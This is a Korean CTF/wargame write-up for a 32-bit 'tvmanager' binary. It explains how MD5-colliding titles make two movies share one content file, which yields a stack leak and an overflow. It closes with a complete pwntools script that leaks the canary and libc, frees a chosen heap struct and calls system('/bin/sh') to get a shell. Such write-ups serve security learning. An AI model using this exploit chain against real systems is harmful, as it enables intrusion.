---
layout: post
title: "tvmanager"
comments : true
category : War Game
---

# 문제
***

tvmanager 바이너리의 checksec 결과는 다음과 같다. 
```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

file 명령어의 결과는 다음과 같다.
```
tvmanager: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=a573c759b08864e640050b1130cc9bfcc98d671b, stripped
```

바이너리 코드 <br/>

영화 목록 구조체의 구성은 다음과 같다. (malloc(0x14)를 통해 할당)
```
영화 내용 크기 (int형) | 영화 종류 번호 (int형) | 영화 제목이 저장된 영역의 주소 (malloc을 통해 힙에 할당, char * 형) | fd | bk
```

dword_4100 영역에 가장 처음에 선언된 영화 목록 구조체의 주소를 저장 <br/>
dword_40E4 영역에 총 영화 개수를 저장

__sub_18B0()__
```c
signed int sub_18B0()
{
  ...
  v12 = __readgsdword(0x14u);
  printf("Input title of movie > ");
  read(0, src, 0x100u);
  for ( i = 0; i <= 0xFF && src[i]; ++i )
  {
    if ( src[i] == 10 )
    {
      src[i] = 0;
      break;
    }
  }
  j = dword_4100;
  i = 0;
  while ( j )
  {
    if ( !strcmp(*(const char **)(j + 8), src) )
    {
      puts("[-] Duplicate title");
      return -1;
    }
    j = *(_DWORD *)(j + 12);
  }
  ...
  printf("Input category of movie > ");
  _isoc99_scanf("%d", &v4);
  if ( (unsigned int)--v4 <= 4 )
  {
    printf("Input size of movie > ");
    _isoc99_scanf("%d", &n);
    if ( n <= 0x2000 )
    {
      if ( n > 0x3FF )
      {
        ptr = malloc(n + 1);
        memset(ptr, 0, n + 1);
        fread(ptr, 1u, n, stdin);
      }
      else
      {
        memset(&s, 0, n + 1);
        fread(&s, 1u, n, stdin);
        ptr = &s;
      }
      ...
      sub_1FAE(*((_DWORD *)v9 + 2), v2, (int)src); # title의 MD5 hash 값을 src에 저장 
      stream = fopen(src, "wb");
      fwrite(ptr, 1u, *(_DWORD *)v9, stream);
      ...
}
```

__sub_18B0()__ 는 영화를 추가하는 함수이다. 해당 함수에서 title 중복 검사는 입력받은 title 문자열으로 하고 해당 영화의 content는 MD5(title 문자열)의 결과값을 제목으로 한 파일에 저장한다.

__sub_1DA7()__
```c
signed int sub_1DA7()
{
  ...
  _BYTE v7[1024]; // [esp+24h] [ebp-414h]
  size_t n; // [esp+424h] [ebp-14h]
  void *ptr; // [esp+428h] [ebp-10h]
  unsigned int v10; // [esp+42Ch] [ebp-Ch]

  v10 = __readgsdword(0x14u);
  ...
  printf("Input index of movie > ");
  _isoc99_scanf("%d", &v3);
  if ( v3 <= dword_40E4 && v3 )
  {
    v6 = dword_4100;
    for ( i = 1; i < v3; ++i )
      v6 = *(_DWORD *)(v6 + 12);
    n = *(_DWORD *)v6;
    v1 = strlen(*(const char **)(v6 + 8));
    sub_1FAE(*(_DWORD *)(v6 + 8), v1, src);
    stream = fopen(src, "rb");
    if ( n > 0x3FF )
    {
      ptr = malloc(n + 1);
      fread(ptr, 1u, n, stream);
      sub_2038((int)ptr, *(_DWORD *)v6);
    }
    else
    {
      for ( i = 0; ; ++i )
      {
        v2 = fgetc(stream);
        if ( v2 == -1 )
          break;
        v7[i] = v2;
      }
      sub_2038((int)v7, *(_DWORD *)v6);
    }
    fclose(stream);
    if ( n > 0x3FF )
      free(ptr);
    result = 0;
  ...
}
```

__sub_1DA7()__ 는 영화 내용을 소켓을 통해서 전송하는 함수이다. 해당 함수는 영화 content의 크기가 0x400 이상이면 content를 힙에 저장하고 0x399 이하면 스택에 해당 content를 저장한다. 그런데 content의 크기가 0x399 이하일 때는 길이 검사 없이 fgetc의 return 값이 -1일 때 까지 파일의 내용을 읽어온다.<br/>

__취약점__ <br/>
__sub_18B0()__ 함수에서 hash collision을 이용하면 동일한 파일에 두 번 write 할 수 있다. 그리고 이를 이용하면 __sub_1DA7()__ 함수에서 leak과 bof를 발생시킬 수 있다.

#### leak, bof 방법
hash collision 쌍 (a,b)를 title로 하는 영화를 차례대로 등록한다. a를 title로 하는 영화의 content 길이를 X로 하고 b를 title로 하는 영화의 content를 Y라 하자. X < Y 이고 X < 0x400 일 때 __sub_1DA7()__ 함수를 이용해서 a의 content 파일을 읽으면 해당 content 파일에는 Y 크기의 내용이 써져 있기 때문에 bof가 발생한다. 또한 X > Y 이고 X < 0x400 일 때 a의 content를 읽어오면 스택에 있는 쓰레기 값들을 읽어올 수 있다. 즉, leak을 할 수 있다.

## exploit 방법
1. 위에서 설명한 leak 방법을 이용해서 libc_base, stack 주소 (canary 위치), heap 영역 주소 및 첫 번째 영화 목록 구조체의 주소 등을 알아낸다.
2. __sub_1DA7()__ 에서 bof를 발생시킬 때 ``` if ( n > 0x3FF ) free(ptr);``` 의 n과 ptr의 값을 overwrite 할 수 있다. 이를 이용해서 1번에서 알아낸 첫 번째 영화 목록 구조체를 free 시킨다. 
3. 그 이후 title을 malloc 할 때 그 크기를 0x18이 되도록 하면 첫 번째 영화 목록 구조체를 할당 받을 수 있다. 이를 통해서 첫 번째 영화 목록 구조체의 title 주소 영역을 canary 주소로 overwrite 하면 canary 값을 알아낼 수 있다.
4. __sub_1DA7()__ 에서 bof를 한 번 더 일으켜서 system 함수를 호출하면 쉘을 딸 수 있다,

__주의할 점 1__ <br/>
leak 할 때 hash collision 쌍 (a,b)를 title로 하는 영화를 등록한 프로세스에서 __sub_1DA7()__를 호출하면 stackd에 있는 쓰레기 값이 Y 내용으로 overwrite 되어 있어서 leak을 할 수 없다. 따라서 hash collision 쌍을 등록한 후 프로세스를 종료하고 새로운 프로세스에서 a의 content를 읽어와야 한다. <br/>

__주의할 점 2__ <br/>
hash collision 쌍 두 개만 이용하면 위의 문제를 해결할 수 있다. 우리가 영화 목록 구조체의 title이 저장되어 있는 곳을 canary 주소로 바꿨기 때문에 title 중복 조건에 걸리지 않고 해당 title로 영화를 한 번 더 등록할 수 있다.

# 풀이
***
```
#!/usr/bin/python

from pwn import *
from random import *
import time

file_path="/home/sungyun/round5/tvmanager/tvmanager"

def reg_movie(title,category_num,content_size,content):
	p.recvuntil("> ")
	p.sendline("2")
	p.recvuntil("> ")
	p.sendline(title)
	p.recvuntil("> ")
	p.sendline(str(category_num))
	p.recvuntil("> ")
	p.send(str(content_size))
	time.sleep(0.1)
	p.send(content)

def broad_movie(index,floor,room,channel):
	p.recvuntil("> ")
	p.sendline("3")
	p.recvuntil("> ")
	p.sendline(str(index))
	p.recvuntil("> ")
	p.sendline(str(floor)+"-"+str(room)+"-"+str(channel))

def list_movie():
	p.recvuntil("> ")
	p.sendline("1")
	p.recvuntil("-\n")
	p.recvuntil("-\n")


p=process(file_path)
libc=ELF("/lib/i386-linux-gnu/libc.so.6")
leak_cha=listen(7777)

leak_cha.clean(0)

p.recvuntil("> ")

dir="hawe"+str(randint(0,100000))
p.send(dir)

#leak_libc
col_1="d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70"
col_2="d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70"

col_1=col_1.decode('hex')
col_2=col_2.decode('hex')

content1="hawe^_______________________________________^;;bawe^___________________________________________________________________________________________________________________________^"
content1+="A"*(0x300-len(content1))
content2="hawe;;bawe"

reg_movie(col_1,1,len(content1),content1)
reg_movie(col_2,1,len(content2),content2)

p.sendline("4")
p.close()

p=process(file_path)

p.recvuntil("> ")
p.send(dir)

broad_movie(1,19,150,7777)

leak_cha.recv(76)
canary_loc=u32(leak_cha.recv(4))+0x36c+0x80
libc_base=u32(leak_cha.recv(4))-21-libc.symbols['__fxstat64']
leak_cha.recv(32)
heap=u32(leak_cha.recv(4))-8
leak_cha.recv(0x270-120+8)
system=libc_base+libc.symbols['system']
sh=libc_base+list(libc.search('/bin/sh\x00'))[0]

chain=heap+0x1170

code_base=u32(leak_cha.recv(4))-0x1809
got_sec=code_base+0x4000

col_3="0e306561559aa787d00bc6f70bbdfe3404cf03659e704f8534c00ffb659c4c8740cc942feb2da115a3f4155cbb8607497386656d7d1f34a42059d78f5a8dd1ef"
col_4="0e306561559aa787d00bc6f70bbdfe3404cf03659e744f8534c00ffb659c4c8740cc942feb2da115a3f415dcbb8607497386656d7d1f34a42059d78f5a8dd1ef"

col_3=col_3.decode('hex')
col_4=col_4.decode('hex')

content3="su_______________________________bal"
content4="A"*0x400
content4+=p32(0x600)
content4+=p32(chain)

reg_movie(col_3,1,len(content3),content3)
reg_movie(col_4,1,len(content4),content4)

broad_movie(3,19,150,7777)

leak_string="\xff"*8
leak_string+=p32(canary_loc+1)
leak_string+=p32(chain+0xa0)

reg_movie(leak_string,1,16,"A"*16)

p.recvuntil("> ")
p.sendline("1")
p.recvuntil("-\n")

p.recvuntil("Titile : ")
canary=u32("\x00"+p.recv(3))

pay="B"*0x400
pay+=p32(0x600)
pay+=p32(chain)
pay+=p32(canary)
pay+="AAAA"*3
pay+=p32(system)
pay+="AAAA"
pay+=p32(sh)

reg_movie(col_1,1,len(pay),pay)

broad_movie(2,19,150,7777)

p.interactive()
```
